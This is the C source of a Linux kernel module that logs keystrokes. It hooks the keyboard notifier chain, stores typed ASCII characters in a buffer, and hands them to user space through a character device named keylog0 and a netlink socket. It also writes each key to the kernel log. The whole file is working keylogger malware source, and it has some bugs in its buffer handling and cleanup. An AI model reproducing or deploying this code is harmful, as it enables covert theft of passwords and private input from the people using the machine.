#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/notifier.h>
#include <net/sock.h>
#include <linux/netlink.h>
#include <linux/skbuff.h>

#define NETLINK_USER 31

struct sock *nl_sk = NULL;

// Module Info
#define DEVICE_NAME "keylog0"  // The Device name for our Device Driver
static int major;  // The Major Number that will be assigned to our Device Driver

// Keylogger Info
#define BUFFER_LEN 1024
static char keys_buffer[BUFFER_LEN];  // This buffer will contain all the logged keys
static char *keys_bf_ptr = keys_buffer;
// Our buffer will only be of size 1024. If the user typed more that 1024 valid characters, the keys_buf_ptr would overflow
int buf_pos = 0;  // buf_pos keeps track of the count of characters read to avoid overflows in kernel space

// Prototypes
static ssize_t dev_read(struct file *, char __user *, size_t, loff_t *); // Device Driver read prototype
static int keys_pressed(struct notifier_block *, unsigned long, void *); // Callback function for the Notification Chain

// Setting the Device Driver read function
static struct file_operations fops = {
	.read = dev_read
};

// Initializing the notifier_block
static struct notifier_block nb = {
	.notifier_call = keys_pressed
};

// call back for netlink request from client 
static void hello_nl_recv_msg(struct sk_buff *skb) {

	struct nlmsghdr *nlh;
	int pid;
	struct sk_buff *skb_out;
	int msg_size;
	//char *msg="Hello from kernel";
	int res;

	printk(KERN_INFO "Entering: %s\n", __FUNCTION__);

	//msg_size=strlen(msg);
	msg_size=strlen(keys_buffer);

	nlh=(struct nlmsghdr*)skb->data;
	printk(KERN_INFO "Netlink received msg payload:%s\n",(char*)nlmsg_data(nlh));
	pid = nlh->nlmsg_pid; /*pid of sending process */

	skb_out = nlmsg_new(msg_size,0);
	
	

//	int ret = copy_to_user(buf, keys_buffer, len);


	if(!skb_out)
	{

		printk(KERN_ERR "Failed to allocate new skb\n");
		return;

	} 
	nlh=nlmsg_put(skb_out,0,0,NLMSG_DONE,msg_size,0);  
	NETLINK_CB(skb_out).dst_group = 0; /* not in mcast group */
	//strncpy(nlmsg_data(nlh),msg,msg_size);
        strncpy(nlmsg_data(nlh),keys_buffer,msg_size);
	res=nlmsg_unicast(nl_sk,skb_out,pid);
        memset(keys_buffer, 0, BUFFER_LEN); // Reset buffer after each read
	keys_bf_ptr = keys_buffer; // Reset buffer pointer	

	if(res<0)
		printk(KERN_INFO "Error while sending bak to user\n");
}









static int keys_pressed(struct notifier_block *nb, unsigned long action, void *data) {
	struct keyboard_notifier_param *param = data;
	//printk(KERN_ALERT "!!!!! keylog0 Key proessed !!!!!!\n");
	// We are only interested in those notifications that have an event type of KBD_KEYSYM and the user is pressing down the key
	if (action == KBD_KEYSYM && param->down) {
		char c = param->value;

		// We will only log those key presses that actually represent an ASCII character.
		if (c == 0x01) {
			*(keys_bf_ptr++) = 0x0a;
			buf_pos++;
		} else if (c >= 0x20 && c < 0x7f) {
			*(keys_bf_ptr++) = c;
			buf_pos++;
			printk(KERN_ALERT "!!!!! keylog0 Key pressed = %c!!!!!!\n",c);
		}

		// Beware of buffer overflows in kernel space!! They can be catastrophic!
		if (buf_pos >= BUFFER_LEN) {
			buf_pos = 0;
			memset(keys_buffer, 0, BUFFER_LEN);
			keys_bf_ptr = keys_buffer;
		}
	}
	return NOTIFY_OK; // We return NOTIFY_OK, as "Notification was processed correctly"
}

// Device driver read function
static ssize_t dev_read(struct file *fp, char __user *buf, size_t length, loff_t *offset) {
	int len = strlen(keys_buffer);
	int ret = copy_to_user(buf, keys_buffer, len);
	if (ret) {
		printk(KERN_INFO "Couldn't copy all data to user space\n");
		return ret;
	}
	memset(keys_buffer, 0, BUFFER_LEN); // Reset buffer after each read
	keys_bf_ptr = keys_buffer; // Reset buffer pointer
	return len;
}

static int __init keylog_init(void) {
	
    //This is for 3.6 kernels and above 
	// for netlink 
	struct netlink_kernel_cfg cfg = {
    .input = hello_nl_recv_msg,
	};
	printk("Entering: %s\n",__FUNCTION__);
	major = register_chrdev(0, DEVICE_NAME, &fops);
	if (major < 0) {
		printk(KERN_ALERT "keylog failed to register a major number\n");
		return major;
	}

	printk(KERN_INFO "Registered keylogger with major number %d", major);

	register_keyboard_notifier(&nb);
	memset(keys_buffer, 0, BUFFER_LEN);

	nl_sk = netlink_kernel_create(&init_net, NETLINK_USER, &cfg);
	//nl_sk = netlink_kernel_create(&init_net, NETLINK_USER, 0, hello_nl_recv_msg,NULL,THIS_MODULE);
	if(!nl_sk)
	{

		printk(KERN_ALERT "Error creating socket.\n");
		return -10;

	}
		
	return 0;
}

static void __exit keylog_exit(void) {
	unregister_chrdev(major, DEVICE_NAME);
	unregister_keyboard_notifier(&nb);
	printk(KERN_INFO "Keylogger unloaded\n");
}

module_init(keylog_init);
module_exit(keylog_exit);
MODULE_LICENSE("GPL");


